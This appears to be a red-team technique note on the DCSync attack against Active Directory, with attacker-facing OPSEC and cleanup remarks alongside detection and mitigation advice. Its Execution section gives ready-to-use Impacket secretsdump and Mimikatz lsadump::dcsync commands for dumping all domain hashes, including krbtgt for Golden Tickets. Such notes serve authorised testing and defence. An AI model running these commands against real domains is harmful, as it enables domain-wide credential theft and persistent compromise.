---
tags:
  - "#type/technique"
  - "#tactic/TA0006"
  - "#technique/T1003.006"
  - "#stage/privilege-escalation"
  - "#stage/credential-access"
  - "#os/windows"
  - "#tool/mimikatz"
  - "#tool/impacket"
  - "#protocol/ldap"
aliases:
  - DCSync Attack
  - Domain Controller Synchronization
  - Directory Replication Service
---

## Technique
___

DCSync is a credential theft technique that abuses the Windows Domain Controller replication process. It allows an attacker to impersonate a domain controller and request account password data from the targeted DC using the Directory Replication Service (DRS) Remote Protocol.

The attack exploits the legitimate replication functionality that domain controllers use to synchronize Active Directory data across the domain. By simulating a DC requesting replication data, an attacker can extract sensitive information such as NTLM hashes, password history, and Kerberos keys for any domain user, including administrator accounts and service accounts.

## Prerequisites
___

**Access Level:** The attacker needs to control an account with specific replication permissions:
- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All
- DS-Replication-Get-Changes-In-Filtered-Set

These permissions are typically granted to:
- Domain Admins
- Enterprise Admins
- Domain Controllers
- Administrators

**System State:** A domain controller must be reachable from the attacker's position in the network.

**Information:** Domain name and IP address of a domain controller.

## Considerations
___

**Impact**

Successful DCSync attacks allow an attacker to obtain the password hashes of all domain users, including the krbtgt account. With this information, an attacker can:
- Conduct offline password cracking
- Perform Pass-the-Hash attacks
- Create Golden Tickets (if the krbtgt hash is obtained)

**OPSEC**

- DCSync generates replication requests that can be logged in the directory service event logs (Event ID 4662).
- Modern detection systems specifically monitor for replication requests from non-domain controllers.
- The attack generates network traffic to domain controllers that can be detected with proper monitoring.

## Execution
___

### Using Impacket (from Linux)

```bash
impacket-secretsdump 'domain.local'/'<user>':'<pass>'@'<DC_IP>'
```

To output to a file:
```bash
impacket-secretsdump 'domain.local'/'<user>':'<pass>'@'<DC_IP>' -outputfile dcsync_hashes
```

To target a specific user:
```bash
impacket-secretsdump 'domain.local'/'<user>':'<pass>'@'<DC_IP>' -just-dc-user administrator
```

### Using Mimikatz (from Windows)

First, run a PowerShell session as the user with replication rights:
```powershell
runas /netonly /user:DOMAIN\user powershell
```

Then execute Mimikatz:
```powershell
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\administrator
```

To extract all domain hashes:
```powershell
lsadump::dcsync /domain:DOMAIN.LOCAL /all
```

To specifically target the krbtgt account (for Golden Ticket attacks):
```powershell
lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt
```

## Cleanup Considerations
___

- DCSync is generally a "read-only" attack that doesn't modify domain objects
- However, event logs will contain evidence of the attack
- The activity will leave a trace in network traffic logs

## Detection & Mitigation
___

### Detection

- Monitor for Event ID 4662 showing replication requests from computers that are not domain controllers
- Look for network traffic patterns consistent with Active Directory replication from unauthorized sources
- Implement honey accounts and monitor for replication requests targeting these accounts
- Use tools like Microsoft ATA or Defender for Identity to detect suspicious replication activity

### Mitigation

- Strictly limit which accounts have replication permissions in the domain
- Regularly audit and review accounts with replication rights
- Implement the principle of least privilege for all administrative accounts
- Use dedicated admin accounts with Protected Users group membership when possible
- Monitor and alert on changes to Directory Service replication permissions
- Consider implementing a tiered administrative model to isolate domain admin credentials